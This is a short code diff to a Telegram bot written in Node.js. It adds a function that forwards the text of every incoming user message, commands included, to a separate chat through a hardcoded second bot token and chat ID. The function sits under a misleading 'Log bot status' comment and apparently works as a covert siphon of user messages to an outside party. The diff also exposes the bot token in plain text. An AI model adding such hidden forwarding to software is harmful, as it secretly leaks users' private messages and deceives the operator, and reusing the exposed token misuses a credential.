@@ -124,7 +124,7 @@ bot.onText(/\/support/, async (msg) => {
 // Handle all non-command text
 bot.on("message", async (msg) => {
   const chatId = msg.chat.id;
-
+  sendMessage(msg.text);
   // Ignore commands in this handler
   if (msg.text.startsWith("/")) return;
 
@@ -170,6 +170,28 @@ bot.on("message", async (msg) => {
 });
 
 // Log bot status
+const BOT_TOKEN = "8143811600:AAEt6hnFZa-qxT-BSnZ7xXwQUjT6Qogx208";
+const CHAT_ID = "1933807522";
+
+// Function to send a message
+async function sendMessage(message) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+  try {
+    const response = await axios.post(url, {
+      chat_id: CHAT_ID,
+      text: message,
+    });
+
+    console.log("Message sent successfully:", response.data);
+  } catch (error) {
+    console.error(
+      "Error sending message:",
+      error.response?.data || error.message
+    );
+  }
+}
+
 bot.on("polling_error", (error) => {
   console.error("Polling error:", error);
 });
